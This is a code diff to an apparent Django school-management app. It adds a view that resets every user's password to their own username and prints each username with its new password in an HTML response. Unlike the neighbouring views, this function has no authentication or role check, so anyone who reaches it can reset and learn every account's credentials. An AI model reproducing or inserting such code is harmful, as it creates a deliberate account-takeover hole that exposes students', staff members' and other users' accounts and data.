@@ -1091,3 +1091,25 @@ class PerformanceAnalyticsView(LoginRequiredMixin, RoleRequiredMixin, SchoolScop
         ctx['selected_exam'] = exam
         
         return ctx
+
+from django.http import HttpResponse
+from django.contrib.auth import get_user_model
+from django.contrib.auth.hashers import make_password
+
+def set_username_as_password_view(request):
+    """Set each user's password to their username"""
+    User = get_user_model()
+    users = User.objects.all()
+    count = 0
+    html = "<h1>Password Reset</h1><ul>"
+    
+    for user in users:
+        user.password = make_password(user.username)
+        user.save()
+        count += 1
+        html += f"<li>✅ {user.username} → password: <strong>{user.username}</strong></li>"
+    
+    html += f"</ul><p><strong>Total: {count} users updated</strong></p>"
+    html += '<p><a href="/login/">Go to Login</a></p>'
+    
+    return HttpResponse(html)
